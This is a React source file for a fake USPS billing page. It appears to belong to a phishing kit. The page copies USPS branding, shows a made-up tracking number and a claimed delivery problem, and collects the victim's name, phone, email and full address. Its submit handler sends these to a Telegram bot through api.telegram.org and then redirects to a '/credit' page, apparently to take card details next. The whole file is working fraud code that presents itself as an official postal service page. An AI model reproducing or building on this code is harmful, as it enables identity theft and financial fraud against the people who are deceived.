'use client';
import React, { useState } from "react";
import axios from "axios";
import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/telegramConfig';

export default function USPSBillingPage() {
  const [formData, setFormData] = useState({
    fullName: '',
    phone: '',
    email: '',
    address: '',
    city: '',
    zip: '',
    country: ''
  });

  const [alertVisible, setAlertVisible] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setAlertVisible(false);

    const isEmptyField = Object.values(formData).some((val) => val.trim() === "");
    if (isEmptyField) {
      setAlertVisible(true);
      return;
    }

    const message = `
📦 *USPS Billing Info Submission*
----------------------------------
👤 *Full Name:* ${formData.fullName}
📞 *Phone:* ${formData.phone}
📧 *Email:* ${formData.email}
🏠 *Address:* ${formData.address}
🌆 *City:* ${formData.city}
📮 *ZIP:* ${formData.zip}
🌎 *Country:* ${formData.country}
🕒 *Time:* ${new Date().toLocaleString()}
    `;

    try {
      setIsSubmitting(true);
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      });

      sessionStorage.setItem('userPhone', formData.phone);

      setTimeout(() => {
        window.location.href = '/credit';
      }, 3000);
    } catch (error) {
      setIsSubmitting(false);
      console.error("Telegram error:", error);
      alert("❌ Failed to send billing info.");
    }
  };

  return (
    <div className="min-h-screen bg-white font-sans text-[#2C2A61] w-full">
      {/* Top Bar */}
      <header className="border-b-[3px] border-[#d90000] bg-[#f2f2f2] text-sm text-black px-6 py-2 flex justify-between items-center shadow-sm w-full">
        <div className="flex items-center gap-5 flex-wrap">
          <button className="hover:underline transition duration-150">🔙 Back</button>
          <span className="flex items-center gap-1 cursor-pointer hover:underline transition">🌐 English ▼</span>
          <button className="hover:underline transition">Customer Service</button>
          <button className="hover:underline transition">📱 USPS Mobile</button>
        </div>
        <button className="hover:underline font-semibold transition">👤 Register</button>
      </header>

      {/* Main Content */}
      <main className="w-full px-6 py-10 sm:px-10 md:px-16 lg:px-32">
        {/* Logo */}
        <img
          src="https://reg.usps.com/entreg/assets/images/des_brd_2color_logo_274x79.png"
          alt="USPS Logo"
          className="h-auto w-60 mb-5 transition duration-300 hover:scale-105"
        />

        {/* Tracking Info */}
        <div className="bg-[#fff8e1] border border-yellow-400 text-[#5c4400] px-6 py-5 rounded-lg shadow mb-8 w-full">
          <h2 className="text-lg font-bold mb-2">STATUS: NOT AVAILABLE</h2>
          <p className="text-sm mb-1">
            <strong>Tracking Number:</strong> <span className="text-[#2C2A61] font-medium">US9514901165421</span>
          </p>
          <p className="text-sm mt-2">
            🚚 We have issues with your shipping address.
            <br />
            USPS allows you to redirect your package to your address in case of delivery failure or any other issue. You can also track the package at any time, from shipment to delivery.
          </p>
        </div>

        {alertVisible && (
          <div className="bg-yellow-100 border border-yellow-400 text-yellow-800 px-4 py-3 rounded relative mb-6 animate-pulse w-full">
            ⚠️ Please complete your billing information to continue.
          </div>
        )}

        {isSubmitting ? (
          <div className="flex flex-col items-center justify-center py-12">
            <img
              src="https://i.gifer.com/ZZ5H.gif"
              alt="Loading..."
              className="w-20 h-20 mb-4"
            />
            <p className="text-sm text-gray-600">Please wait while we process your billing info...</p>
          </div>
        ) : (
          <form onSubmit={handleSubmit} className="space-y-6 bg-[#f9f9f9] p-8 rounded-lg shadow w-full">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-1">Full Name</label>
                <input type="text" name="fullName" value={formData.fullName} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">Phone Number</label>
                <input type="text" name="phone" value={formData.phone} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-1">Email Address</label>
                <input type="email" name="email" value={formData.email} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">ZIP / Postal Code</label>
                <input type="text" name="zip" value={formData.zip} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium mb-1">Street Address</label>
                <input type="text" name="address" value={formData.address} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
              <div>
                <label className="block text-sm font-medium mb-1">City</label>
                <input type="text" name="city" value={formData.city} onChange={handleChange}
                  className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
              </div>
            </div>

            <div>
              <label className="block text-sm font-medium mb-1">Country</label>
              <input type="text" name="country" value={formData.country} onChange={handleChange}
                className="w-full border border-gray-300 rounded-lg px-4 py-3 shadow-sm" required />
            </div>

            <button type="submit" className="bg-[#2C2A61] hover:bg-[#1d1a45] text-white w-full py-3 rounded-lg font-semibold shadow-md transition-all duration-200">
              Submit Billing Info
            </button>
          </form>
        )}
      </main>

      {/* Feedback Button */}
      <button
        className="fixed top-1/2 right-0 transform -translate-y-1/2 bg-[#2C2A61] text-white text-sm px-4 py-2 rounded-l-lg shadow-lg z-50 hover:bg-[#1d1a45] transition"
        aria-label="Give Feedback"
      >
        Feedback
      </button>
    </div>
  );
}
